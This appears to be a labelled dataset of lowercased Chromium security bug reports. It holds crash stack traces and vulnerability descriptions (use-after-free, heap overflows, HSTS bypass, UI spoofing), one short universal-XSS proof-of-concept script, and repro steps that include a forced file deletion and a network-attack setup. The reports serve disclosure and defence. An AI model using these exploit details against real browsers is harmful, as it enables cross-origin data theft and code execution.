media/filters/vpx_video_decoder.cc:324 14 in media decoderstream media demuxerstream type 2 decode scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release media/filters/decoder_stream.cc:296 15 in media decoderstream media demuxerstream type 2 onbufferready media demuxerstream status scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release media/filters/decoder_stream.cc:483 16 in base internal runnableadapter void media decoderstream media demuxerstream type 2 media demuxerstream status scoped_refptr media decoderbuffer const run media decoderstream media demuxerstream type 2 media demuxerstream status const scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release base/bind_internal.h:185 17 in base internal invokehelper true void base internal runnableadapter void media decoderstream media demuxerstream type 2 media demuxerstream status scoped_refptr media decoderbuffer const void base weakptr media decoderstream media demuxerstream type 2 const media demuxerstream status const scoped_refptr media decoderbuffer const makeitso base internal runnableadapter void media decoderstream media demuxerstream type 2 media demuxerstream status scoped_refptr media decoderbuffer const base weakptr media decoderstream media demuxerstream type 2 const media demuxerstream status const scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release base/bind_internal.h:391 18 in base internal invoker 1 base internal bindstate base internal runnableadapter void media decoderstream media demuxerstream type 2 media demuxerstream status scoped_refptr media decoderbuffer const void media decoderstream media demuxerstream type 2 media demuxerstream status scoped_refptr media decoderbuffer const void base weakptr media decoderstream media demuxerstream type 2 void media decoderstream media demuxerstream type 2 media demuxerstream status scoped_refptr media decoderbuffer const run base internal bindstatebase media demuxerstream status const scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release base/bind_internal.h:619 19 in base callback void media demuxerstream status scoped_refptr media decoderbuffer const run media demuxerstream status const scoped_refptr media decoderbuffer const const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release base/callback.h:396 thread t5 media created by t0 chrome here 0 in pthread_create 1 in base anonymous namespace createthread unsigned int bool base platformthread delegate base platformthreadhandle base threadpriority mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release base/threading/platform_thread_posix.cc:120 2 in base platformthread create unsigned int base platformthread delegate base platformthreadhandle mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release base/threading/platform_thread_posix.cc:206 3 in base thread startwithoptions base thread options const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release base/threading/thread.cc:108 4 in base thread start mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release base/threading/thread.cc:93 5 in getmediathreadtaskrunner mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release content/renderer/render_thread_impl.cc:1733 6 in content renderframeimpl createmediaplayer blink weblocalframe blink weburl const blink webmediaplayerclient blink webcontentdecryptionmodule mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release content/renderer/render_frame_impl.cc:1868 7 in non-virtual thunk to content renderframeimpl createmediaplayer blink weblocalframe blink weburl const blink webmediaplayerclient blink webcontentdecryptionmodule mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release content/renderer/render_frame_impl.cc:1895 8 in blink createwebmediaplayer blink webmediaplayerclient blink weburl const blink localframe blink webcontentdecryptionmodule mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/web/webmediaplayerclientimpl.cpp:58 9 in blink webmediaplayerclientimpl load blink webmediaplayer loadtype wtf string const blink webmediaplayer corsmode mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/web/webmediaplayerclientimpl.cpp:208 10 in blink htmlmediaelement startplayerload mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlmediaelement.cpp:1058 11 in loadresource mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlmediaelement.cpp:1023 12 in blink htmlmediaelement loadnextsourcechild mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlmediaelement.cpp:959 13 in blink htmlmediaelement selectmediaresource mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlmediaelement.cpp:942 14 in loadinternal mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlmediaelement.cpp:875 15 in blink htmlmediaelement loadtimerfired blink timer blink htmlmediaelement mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlmediaelement.cpp:689 16 in blink timer blink htmlmediaelement fired mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/webkit/source/platform/timer.h:147 discriminator 4 summary addresssanitizer negative-size-param 0 9999==aborting version chrome version asan-symbolized-v8-arm-linux-release-312321 operating system linux reproduction case attached as repro.webm for crashes please include the following additional information type of crash tab	11
security heap-use-after-free in content mediastreamdispatcher onstreamgenerated version chrome version 44.0.2358.0 build dev win23 asan 32 bits operating system windows 7 please watch the video for see how i repro this crash 4868==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in content mediastreamdispatcher onstreamgenerated c b\depot_tools\win_toolchain\vs2013_files\vc\include\list:1448 1 in content mediastreamdispatcher onmessagereceived c b\build\slave\win_asan_release\build\src\base\tuple.h:246 2 in content renderframeimpl onmessagereceived c b\build\slave\win_asan_release\build\src\content\renderer\render_frame_impl.cc:991 3 in content messagerouter routemessage c b\build\slave\win_asan_release\build\src\content\common\message_router.cc:54 4 in content messagerouter onmessagereceived c b\build\slave\win_asan_release\build\src\content\common\message_router.cc:46 5 in content childthreadimpl onmessagereceived c b\build\slave\win_asan_release\build\src\content\child\child_thread_impl.cc:627 6 in ipc channelproxy context ondispatchmessage c b\build\slave\win_asan_release\build\src\ipc\ipc_channel_proxy.cc:282 7 in base internal invoker indexsequence 0,1 base internal bindstate base internal runnableadapter void thiscall content webrtclocalaudiorenderer me dia audioparameters const void cdecl content webrtclocalaudiorenderer media audioparameters const base internal typelist content webrtclocalaudiorenderer media audioparameters base internal typelist base internal unwraptraits content webrtclocalaudiorenderer base internal unwraptraits media audioparameters base interna l invokehelper 0 void base internal runnableadapter void thiscall content webrtclocalaudiorenderer media audioparameters const base internal typelist content we brtclocalaudiorenderer const media audioparameters const void cdecl void run c b\build\slave\win_asan_release\build\src\base\bind_internal.h:176 8 in base debug taskannotator runtask c b\build\slave\win_asan_release\build\src\base\callback.h:396 9 in content taskqueuemanager processtaskfromworkqueue c b\build\slave\win_asan_release\build\src\content\child\scheduler\task_queue_manager.cc:641 10 in content taskqueuemanager dowork c b\build\slave\win_asan_release\build\src\content\child\scheduler\task_queue_manager.cc:599 11 in base internal invoker indexsequence 0,1 base internal bindstate base internal runnableadapter void thiscall content taskqueuemanager bool vo id cdecl content taskqueuemanager bool base internal typelist base weakptr content taskqueuemanager bool base internal typelist base internal unwraptraits base weakptr content taskqueuemanager base internal unwraptraits bool base internal invokehelper 1 void base internal runnableadapter void thiscall content taskqueuema nager bool base internal typelist base weakptr content taskqueuemanager const bool const void cdecl void run c b\build\slave\win_asan_release\build\src\bas e\bind_internal.h:176 12 in base debug taskannotator runtask c b\build\slave\win_asan_release\build\src\base\callback.h:396 13 in base messageloop runtask c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:444 14 in base messageloop dowork c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:454 15 in base messagepumpdefault run c b\build\slave\win_asan_release\build\src\base\message_loop\message_pump_default.cc:32 16 in base messageloop runhandler c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:410 17 in base runloop run c b\build\slave\win_asan_release\build\src\base\run_loop.cc:55 18 in base messageloop run c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:303 19 in content renderermain c b\build\slave\win_asan_release\build\src\content\renderer\renderer_main.cc:220 20 in content runnamedprocesstypemain c b\build\slave\win_asan_release\build\src\content\app\content_main_runner.cc:383 21 in content contentmainrunnerimpl run c b\build\slave\win_asan_release\build\src\content\app\content_main_runner.cc:775 22 in content contentmain c b\build\slave\win_asan_release\build\src\content\app\content_main.cc:19 23 in chromemain c b\build\slave\win_asan_release\build\src\chrome\app\chrome_main.cc:66 24 in maindllloader launch c b\build\slave\win_asan_release\build\src\chrome\app\client_util.cc:238 25 in main c b\build\slave\win_asan_release\build\src\chrome\app\chrome_exe_main_win.cc:157 26 in tmaincrtstartup f dd\vctools\crt\crtw32\startup\crt0.c:255 27 in basethreadinitthunk c windows\system32\kernel32.dll 28 in rtlinitializeexceptionchain c windows\system32\ntdll.dll 29 in rtlinitializeexceptionchain c windows\system32\ntdll.dll is located 0 bytes inside of 24-byte region freed by thread t0 here 0 in free c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:42 1 in content mediastreamdispatcher mediastreamdispatcher c b\depot_tools\win_toolchain\vs2013_files\vc\include\xmemory0:573 2 in content mediastreamdispatcher scalar deleting destructor c b\build\slave\win_asan_release\build\src\content\renderer\media\media_stream_dispatcher.cc:69 3 in content usermediaclientimpl usermediaclientimpl c b\build\slave\win_asan_release\build\src\base\memory\scoped_ptr.h:128 4 in content usermediaclientimpl scalar deleting destructor c b\build\slave\win_asan_release\build\src\content\renderer\media\user_media_client_impl.cc:117 5 in cfx_edit_undoitem release c b\build\slave\win_asan_release\build\src\third_party\pdfium\fpdfsdk\src\fxedit\fxet_edit.cpp:563 6 in content renderframeimpl renderframeimpl c b\build\slave\win_asan_release\build\src\content\renderer\render_frame_impl.cc:711 7 in content renderframeimpl scalar deleting destructor c b\build\slave\win_asan_release\build\src\content\renderer\render_frame_impl.cc:709 8 in content renderframeimpl framedetached c b\build\slave\win_asan_release\build\src\content\renderer\render_frame_impl.cc:2153 9 in blink frameloaderclientimpl detached c b\build\slave\win_asan_release\build\src\third_party\webkit\source\web\frameloaderclientimpl.cpp:331 10 in blink frame detach c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\frame\frame.cpp:80 11 in blink localframe detach c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\frame\localframe.cpp:281 12 in blink htmlframeownerelement disconnectcontentframe c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\htmlframeownerelement.cp p:152 13 in blink childframedisconnector disconnectcollectedframeowners c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\childframediscon nector.cpp:65 14 in blink childframedisconnector disconnect c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\childframedisconnector.cpp:35 15 in blink containernode willremovechild c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\containernode.cpp:427 16 in blink containernode removechild c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\containernode.cpp:556 17 in blink node remove c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\node.cpp:506 18 in blink v8xpathexpression domtemplate c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\childnode.h:16 19 in v8 internal functioncallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:33 20 in v8 internal builtins invokeapifunction c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1088 21 in v8 internal runtime_setallocationtimeout c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1111 previously allocated by thread t0 here 0 in malloc c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:58 1 in operator new f dd\vctools\crt\crtw32\heap\new.cpp:59 2 in std list content mediastreamdispatcher request std allocator content mediastreamdispatcher request push_back c b\depot_tools\win_toolchain\vs2013_f iles\vc\include\xmemory0:28 3 in content mediastreamdispatcher generatestream c b\build\slave\win_asan_release\build\src\content\renderer\media\media_stream_dispatcher.cc:79 4 in content usermediaclientimpl requestusermedia c b\build\slave\win_asan_release\build\src\content\renderer\media\user_media_client_impl.cc:207 5 in blink usermediaclientimpl requestusermedia c b\build\slave\win_asan_release\build\src\third_party\webkit\source\web\usermediaclientimpl.cpp:52 6 in blink usermediarequest start c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\mediastream\usermediacontroller.h:66 7 in blink navigatormediastream webkitgetusermedia c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\mediastream\navigatormediastream cpp:81 8 in blink v8workernavigatorpartial initialize c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\modules\v8\v8navigatorpartial.cpp:477 9 in v8 internal functioncallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:33 10 in v8 internal builtins invokeapifunction c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1088 11 in v8 internal runtime_setallocationtimeout c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1111 summary addresssanitizer heap-use-after-free c b\depot_tools\win_toolchain\vs2013_files\vc\include\list:1448 in content mediastreamdispatcher onstreamgenerated shadow bytes around the buggy address fa fa fd fd fd fa fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa fa fa 00 00 00 fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fd fa fa fd fd fd fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 4868==aborting	11
security on android it s possible to inject text and icons to the page info bubble using crafted url fragments the fragment part of the url is not escaped in any way when displayed in the page info bubble meaning that it s possible use it to inject arbitrary text and even emoji icons to a security-critical part of the browser ui this could be used for phishing or to convince the user that an https connection is secure when it actually is n't version chrome version 40.0.2214.109 stable operating system android 4.4.2 reproduction case 1 go to 2 tap on the link 3 press down on the address bar to open the page info bubble 4 see the injected message and icons	9
use-of-uninitialized-value in skrecords fillbounds adjustandmap detailed report fuzzer miaubiz_css_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state skrecords fillbounds adjustandmap void skrecord record visit void skrecords fillbounds skrecordfillbounds minimized testcase 3.29 kb filer inferno	11
security spell checking dictionaries are fetched over http and large responses lead to a crash vulnerability details this bug is very similar but different to another that was worked recently this time the insecure url is used when downloading spell checking dictionaries the code that needs to be updated to use https is chromium/src/chrome/browser/spellchecker/spellcheck_hunspell_dictionary.cc l=217 an example insecure url that is used is the problem is that the insecure requests can be tampered with by an active network attacker to respond with a large response body which causes the chrome process to allocate large amounts of memory and/or crash with sigabrt here is an example of what happens on the command line when subject to an active network attack google-chrome incognito 5989:5989:0421/090853 error url_pattern_set.cc 240 invalid url pattern chrome print 5989:5989:0421/090854 error extension_downloader.cc 695 invalid url for extension gmlllbghnfkpflemihljekbapjopfjik tcmalloc large alloc 1073741824 bytes 5989:6024:0421/090915 fatal memory_linux.cc 43 out of memory aborted core dumped version chrome version 42.0.2311.90 stable operating system ubuntu 14.04.2 lts reproduction case 1 simulate needing to download a new language by removing existing dictionaries rm rf config/google-chrome/dictionaries 2 perform an active network attack that makes the request to respond with a 1gb response i generated a test file with dd if=/dev/zero of=gig bs=1m count=1024 3 now cause the browser to attempt to download the language there are a few ways of achieving this the most generic that i found was to a navigate to b right click the mouse in the main search entry text box doing so notices that the language needs to be downloaded and causes a crash my intuition says that this occurs because of a need to populate the spelling portion of the context menu although i did not verify that for crashes please include the following additional information type of crash entire browser sig abort crash state see screen shot and description above	4
use-of-uninitialized-value in extract_image_data detailed report fuzzer mbarbella_js_mutation_layout job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state extract_image_data skpdfimage createimage skpdfdevice internaldrawbitmap unminimized testcase filer inferno	11
security heap overflow in certificateresourcehandler this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details theres an integer overflow/truncation issue in the handling of files of certificate mime-types application/x-x509-user-cert and similar of large size 4gig resulting in heap corruption/rce in the chrome browser process the vulnerable code is in content certificateresourcehandler which handles requests for these mime-types the certificateresourcehandler tracks the size of the file in an instance variable content_length of type size_t the files are retrieved in chunks of size 32768 and stored in a vector for later reassembly bool certificateresourcehandler onreadcompleted int bytes_read bool defer if bytes_read return true we have more data to read dcheck read_buffer_.get content_length bytes_read bytes_read 32768 release the ownership of the buffer and store a reference to it a new one will be allocated in onwillread scoped_refptr net iobuffer buffer read_buffer_.swap buffer todo gauravsh should this be handled by a separate thread buffer_.push_back std make_pair buffer bytes_read return true once all of the response data has been retrieved the handler attempts to reassemble these chunks using a freshly allocated iobuffer of sufficient size unfortunately iobuffer takes an int for a size parameter so integer overflow occurs on truncation for sufficiently large files as we then reassemble the response data into the resulting buffer this results in heap corruption beyond the end of the newly allocated iobuffer void certificateresourcehandler assembleresource 0-length iobuffers are not allowed if content_length 0 resource_buffer null return create the new buffer resource_buffer new net iobuffer content_length truncation to int occurs here copy the data into it size_t bytes_copied 0 for size_t i 0 i buffer_.size i net iobuffer data buffer i first.get size_t data_len buffer i second dcheck data null dcheck_le bytes_copied data_len content_length memcpy resource_buffer data bytes_copied data data data_len we will segv here bytes_copied data_len dcheck_eq content_length bytes_copied see report id 99b9ae555621cf6e for an example crash and the attached proof-of-concept code which triggers the issue has been tested on the latest stable linux x64 build this bug is subject to a 90 day disclosure deadline if 90 days elapse without a broadly available patch then the bug report will automatically become visible to the public version chrome version 42.0.2311.135 stable beta or dev operating system linux x64 reproduction case see the attached python script it listens on localhost:8080 and serves up a poc note that the file compressed is just a 1024 gzipped for crashes please include the following additional information type of crash browser crash state see bug id 99b9ae555621cf6e and description client id if relevant see link above	11
unknown in v8 internal simulator decodetypeimmediate detailed report fuzzer mbarbella_js_mutation job type linux_asan_d8_v8_mipsel_dbg crash type unknown crash address crash state v8 internal simulator decodetypeimmediate v8 internal simulator instructiondecode v8 internal simulator execute minimized testcase 0.13 kb download use strict var assertthrows class base class subclass extends base constructor arguments 1 subclass filer inferno	11
use-of-uninitialized-value in void v8 internal scavengingvisitor detailed report fuzzer inferno_layout_test_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state void v8 internal scavengingvisitor v8 internal storebuffer iteratepointersinstorebuffer v8 internal storebuffer iteratepointerstonewspace regressed minimized testcase 0.46 kb filer inferno	11
bad-cast to blink layoutbox from blink layouttext layoutbox.h number:1 detailed report uploader inferno chromium.org job type linux_ubsan_vptr_chrome crash type bad-cast crash address crash state bad-cast to blink layoutbox from blink layouttext layoutbox.h number:1 minimized testcase 8.89 kb filer inferno	11
heap-buffer-overflow in cjbig2_context parsesymboldict heyo the attached test cases seem to kill chrome dev you may need to scroll a bit or try a couple of times dump of assembler code for function cjbig2_arithdecoder decode jbig2arithctx 31 mov r8 ecx r8 4065426288 can not access memory at address with pdfium_test the call stack is 0 in cjbig2_arithdecoder decode this pcx at core/src/fxcodec/jbig2/jbig2_arithdecoder.h:77 1 in cjbig2_grdproc decode_arith_template1_unopt this parithdecoder gbcontext at core/src/fxcodec/jbig2/jbig2_generaldecoder.cpp:586 2 in cjbig2_grdproc decode_arith this=this entry parithdecoder=parithdecoder entry gbcontext=gbcontext entry at core/src/fxcodec/jbig2/jbig2_generaldecoder.cpp:84 3 in cjbig2_sddproc decode_arith this parithdecoder gbcontext grcontext at core/src/fxcodec/jbig2/jbig2_generaldecoder.cpp:2436 4 in cjbig2_context parsesymboldict this psegment optimized out ppause optimized out at core/src/fxcodec/jbig2/jbig2_context.cpp:822 5 in parsesegmentdata ppause psegment this at core/src/fxcodec/jbig2/jbig2_context.cpp:509 6 cjbig2_context decode_squentialorgnazation this=this entry ppause at core/src/fxcodec/jbig2/jbig2_context.cpp:157 7 in decode_squentialorgnazation ppause optimized out this at core/src/fxcodec/jbig2/jbig2_context.cpp:145	11
heap-use-after-free in get_lowest_part_y detailed report fuzzer inferno_flicker job type linux_asan_chrome_media crash type heap-use-after-free read 8 crash address crash state get_lowest_part_y await_references hl_decode_mb_simple_8 unminimized testcase filer inferno	11
heap-use-after-free in blink frameview setscrollbarmodes detailed report fuzzer inferno_twister job type mac_asan_content_shell crash type heap-use-after-free read 8 crash address crash state blink frameview setscrollbarmodes content renderviewimpl onresize content renderviewimpl setdevicescalefactorfortesting regressed minimized testcase 31.88 kb additional requirements requires http filer inferno	11
heap-buffer-overflow in v8 internal simulator decodetype2 detailed report fuzzer mbarbella_js_mutation job type linux_asan_d8_v8_arm crash type heap-buffer-overflow read 4 crash address crash state v8 internal simulator decodetype2 v8 internal simulator instructiondecode v8 internal simulator execute regressed minimized testcase 0.65 kb filer inferno	11
qcms security heap info leak in qcms useragent mozilla/5.0 macintosh intel mac os x 10_9_5 applewebkit/537.36 khtml like gecko chrome/40.0.2214.111 safari/537.36 steps to reproduce the problem load samples what is the expected behavior what went wrong 98c8e33029be249da9724c3836486677 9aeb119e98f4a6e9a390958e0fd88058 ea9918806b7e74827d10b9706e4b273d f5678da26c6a9cc1e65153e17a28bd8a heap-buffer-overflow read of size 4 lut_interp_linear_float third_party/qcms/src/transform_util.c:101:17 11dcaacb804945e4574317fc56ebc5d3 a785ed37b9ce2a357e91a2d0fd53d538 program received signal sigsegv segmentation fault lut_interp_linear_float value=1.35335546e+18 table length=0 at third_party/qcms/src/transform_util.c:101 101 value table upper 1 upper value table lower upper value float lut_interp_linear_float float value float table size_t length int upper lower value value length 1 if length is 0 value will have been adjusted to an arbitrary large float upper ceil value lower floor value value table upper 1 upper value table lower upper value here the asan alert or sigsegv occurs return value potentially this can be used for disclosing memory contents did this work before n/a chrome version 40.0.2214.111 channel stable os version os x 10.9.5 flash version shockwave flash 16.0 r0	11
heap-use-after-free in base messageloop deletesooninternal detailed report fuzzer phoglund_webrtc_peerconnection job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state base messageloop deletesooninternal content gpuchannelhost destroychannel content gpuchannelhost gpuchannelhost regressed minimized testcase 30.17 kb additional requirements requires gestures additional requirements requires http filer inferno	11
bad-cast to blink axmenulist from blink axlist axmenulist.h:58:1 detailed report fuzzer inferno_twister job type linux_ubsan_vptr_content_shell_drt crash type bad-cast crash address crash state bad-cast to blink axmenulist from blink axlist axmenulist.h:58:1 minimized testcase 0.56 kb additional requirements requires http filer aarya	11
heap-use-after-free in blink scriptstreamer streamingcompleteonbackgroundthread detailed report fuzzer inferno_webbot job type windows_asan_chrome crash type heap-use-after-free read 4 crash address crash state blink scriptstreamer streamingcompleteonbackgroundthread blink scriptstreamingtask run content webschedulerimpl runtask unminimized testcase filer inferno	11
heap-use-after-free in base messageloop deletesooninternal detailed report fuzzer phoglund_webrtc_peerconnection job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state base messageloop deletesooninternal content gpuchannelhost destroychannel content gpuchannelhost gpuchannelhost regressed minimized testcase 42.00 kb additional requirements requires gestures additional requirements requires http filer inferno	11
security clank injects javascript into the main page s world clank injects js into the main page s context to extract information for producing thinmbnails somehow we missed this when it originally shipped but caught it due to the addition of a new third party dependency the dangers here are clear enough state leakage between trusted and untrusted code malicious hijacking via name squatting unintentionally injecting vulnerabilities into the page and simple breakage due to e.g csp conflicts so any of these these uses either need to be moved to native code or js that executes in an isolated world cjhopman i assigned to you as the most vocal clank participant in the discussion please reassign if there s someone else more appropriate	11
tracking bug for internal fixes chrome m43 release 0 critical high medium low	11
security cross-origin scripting possible via native functions vulnerability details it is possible to run javascript in a different context e.g in a different origin via certain extension functions exposed to regular webpages see issue 468931 i am filing this as a separate issue since i think this particular exploit is worth fixing as soon as possible the general case issue 468931 appears hard to fix for this issue i was inspired by 1 the idea is to leak the function runwithmodulesystem inside test_custom_bindings.js this exposes the requirenative function to the attacker s web page which can be used to leak the javascript wrapper for the function takebrowserprocessblob in blob_native_handler.cc the problem is that this function sets the return value using args.holder as the creation context this can be faked as in 1 to get the return value object in a different context the technique from 1 see the test there can then be used to run javascript code cross-origin version chrome version 43.0.2357.81 m stable also 45.0.2424.0 downloaded from 2 r333129 operating system stable on windows 8.1 trunk on windows vista reproduction case see the attachments i based them on the ones in issue 468931 save both files in the same directory and open parent.html the sandboxed iframe child.html is able to modify the parent s background color 1 2	2
security universal xss using idbkeyrange static methods vulnerability details calling an object-returning static method with a cross-origin thing passed as this yields an object wrapped in the cross-origin scope this is because functioncallbackinfo ends up with a cross-origin holder and the holder acts as a creation context for the return value in blink scriptwrappable wrap version chrome 43.0.2357.81 release chrome 44.0.2403.18 beta chrome 45.0.2414.0 dev chromium 45.0.2419.0 compiled today reproduction case script var i document.documentelement.appendchild document.createelement iframe i.onload function idbkeyrange.only.call frames 0 0 constructor.constructor alert location i.src data text/html victim script	2
security hsts bypass vulnerability details hsts can be bypassed via fqdn hostnames in chrome 40 this goes for preloaded domains too i was able to reproduce this on domains such as accounts.google.com mail.google.com crowdcurity.com stripe.com blockchain.info etc i was using incognito mode during my tests after the initial request some domains set hsts on the fqdn and that prevent further plain http requests via a 307 internal redirect in chrome an example domain that did not get better was i could hit that domain over and over with plain http in one browser session this may be a regression bug i found this same problem in firefox and when i reported this to them then chrome 38 did not appear to have the issue i reported it to mozilla as someone else had reported it to them concurrently a few days earlier but it was and is still private so i could not have known firefox will have this fixed soon as cve-2015-0832 under ticket please use discretion in sharing this knowledge as it is not public yet but thought it would be useful for you to know if you did n't already obviously this is bad for users being subjected to ssl stripping style attacks etc version chrome version 40.0.2214.115 64-bit stable operating system ubuntu linux 14.04.2 lts reproduction case 0 begin packet sniffer on local machine i used wireshark 1 open affected version of chrome and navigate to 2 notice that the traffic was sent over plain unencrypted http in the network capture for example see attached screenshot	2
use-of-uninitialized-value in ucnv_io_getconvertername_52 detailed report fuzzer attekett_surku_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state ucnv_io_getconvertername_52 ucnv_loadshareddata_52 ucnv_createconverter_52 regressed minimized testcase 0.02 kb download xml encoding x filer inferno	7
security oom situation can result in heap buffer overflow in cfx_binarybuf pdfium vulnerability details cfx_binarybuf expandbuf is implemented as follows void cfx_binarybuf expandbuf fx_strsize add_size fx_strsize new_size add_size m_datasize if m_allocsize new_size return int alloc_step if m_allocstep 0 alloc_step m_allocsize 4 if alloc_step 128 alloc_step 128 else alloc_step m_allocstep new_size new_size alloc_step 1 alloc_step alloc_step fx_lpbyte pnewbuffer m_pbuffer if pnewbuffer pnewbuffer fx_realloc fx_byte m_pbuffer new_size else pnewbuffer fx_alloc fx_byte new_size if pnewbuffer m_pbuffer pnewbuffer m_allocsize new_size the function does n't return an error code so a calling function ca n't tell whether a reallocation failed if the call to fx_realloc fails pnewbuffer will be zero and m_pbuffer will not be reassigned and the code will continue to run with the insufficient buffer size this can for example be exploited through calls to cfx_widetextbuf appendchar void cfx_widetextbuf appendchar fx_wchar ch if m_allocsize m_datasize fx_strsize sizeof fx_wchar expandbuf sizeof fx_wchar assert m_pbuffer null fx_wchar m_pbuffer m_datasize ch m_datasize sizeof fx_wchar version chrome version tested against latest pdfium_test 32 and 64-bit reproduction case reproduction of oom issues is a little tricky i have written a custom asan patch which allows me to limit the overall malloc'ed size which makes issues like this easier to find and reliable to reproduce the patch simulates the behaviour of a real world allocator return null on failed allocation the patch is attached as asan_alloc_limit.patch using an asan build with this patch allows us to reproduce the issue reliable using the attached test.pdf asan_options=asan_alloc_limit_mb=256 allocator_may_return_null=1 pdfium_test test.pdf 20607==warning hit total allocation size limit of 256mb while trying to allocate 2450560 bytes 20607==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 1 at thread t0 0 in appendchar home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser include/fpdfapi fxcrt/fx_basic.h:63 1 in getobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:2115 2 in getobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:2191 3 in parseindirectobjectat home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1399 4 in parseindirectobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1202 5 in getindirectobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_objects.cpp:1218 6 in getdirect home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_objects.cpp:231 7 in start home/nils/build/targets/chrome/src/out/release 